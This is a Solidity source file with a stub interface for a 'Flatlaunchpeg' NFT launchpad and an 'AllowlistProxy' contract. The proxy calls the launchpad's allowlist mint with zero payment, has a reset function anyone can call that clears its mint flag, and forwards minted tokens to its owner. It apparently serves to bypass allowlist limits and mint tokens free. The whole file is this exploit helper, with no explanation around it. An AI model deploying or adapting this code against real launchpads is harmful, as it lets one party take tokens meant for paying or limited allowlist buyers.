pragma solidity ^0.8.4;

contract Flatlaunchpeg {
    function allowlistMint(uint256 quantity) external payable {}
    function safeTransferFrom(address from, address to, uint256 tokenId) external {}
    uint256 public allowlistStartTime;
}

contract AllowlistProxy {
    address private _owner;
    address private _target;
    bool private _minted = false;

    constructor(address target) {
        _owner = msg.sender;
        _target = target;
    }

    function remoteAllowlistMint() external payable {
        require(!_minted);
        Flatlaunchpeg(_target).allowlistMint{value:0}(1);
        _minted = true;
    }

    function withdraw(uint256 tokenId) external {
        require(msg.sender == _owner);
        Flatlaunchpeg(_target).safeTransferFrom(address(this), _owner, tokenId);
    }

    function reset() external {
        _minted = false;
    }

    function allowlistStartTime() public view returns(uint256) {
        return Flatlaunchpeg(_target).allowlistStartTime();
    }
}